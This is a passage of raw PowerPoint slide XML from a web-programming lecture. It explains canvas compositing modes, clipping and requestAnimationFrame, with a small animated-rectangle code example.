                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>Canvas Compositing &amp; Clipping</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="147459" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CE3C5AD1-4359-401B-B0B0-EE8905AB1656}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2800" b="1"/>
              <a:t>globalCompositeOperation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2800"/>
              <a:t> = type</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI"/>
              <a:t>source-over (default), source-in, source-out, source-atop</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI"/>
              <a:t>destination-over, destination-in, destination-out, destination-atop</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI"/>
              <a:t>lighter, darker, xor, copy</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2800" b="1"/>
              <a:t>clip() </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2800"/>
              <a:t>use the current path as the clipping region for subsequent drawing operations (beginPath(), arc(), lineTo() etc.)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2800"/>
              <a:t>by default the canvas </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800"/>
              <a:t>has a clipping path that's the exact same size as the canvas itself (no clipping occurs). </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a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{01243A52-C5C9-4F2E-A5E7-3C575F0F8807}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Creating an Animation with Canvas</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="148483" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4EE7915B-8DED-4AEE-BE68-4203AA4327F3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" b="1" dirty="0" err="1"/>
              <a:t>window.requestAnimationFrame</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" i="1" dirty="0"/>
              <a:t>function</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0"/>
              <a:t>)  tells the browser that you wish to perform an animation and requests that the browser call a specified </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" i="1" dirty="0"/>
              <a:t>function</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0"/>
              <a:t> to update an animation before the next repaint.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:br>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0"/>
            </a:b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function</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>draw</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>() {</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window</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requestAnimationFrame</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">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draw</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canvas</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>document</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getElementById</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a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>canvas</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"</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ctx</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>canvas</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getContext</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"2d"</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ctx</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>clearRect</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>0</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>0</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canvas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width</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>canvas</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>height</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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do</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your</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drawing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>here</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p>
          <a:p>
            <a:endParaRPr lang="fi-FI" sz="1600" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49"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a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{351628C1-D46C-4071-A4DB-54BDECF0852A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Animated Rectangle</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="149507" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{47E7F0F6-8FCA-42F4-83C6-203488FBBFFA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1340768"/>
            <a:ext cx="10972800" cy="5242594"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>script</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;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canvas</a:t>
            </a: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var</a:t>
            </a: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x</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10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function</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>draw</a:t>
            </a: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window</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requestAnimationFrame</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">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draw</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canvas</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document</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getElementById</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canvas</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a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>canvas</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getContext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"2d"</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a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ctx.clearRect</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(0, 0, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>canvas.width</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canvas.height</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a: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strokeStyle</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"#000"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001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>lineWidth</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>3</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err="1">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ctx</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>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strokeRect</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>x</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10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400</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>300</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r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>x</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>++;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>            }</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>script</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" sz="1600" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:br>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>body</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>onload</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>draw</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>()"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;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800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
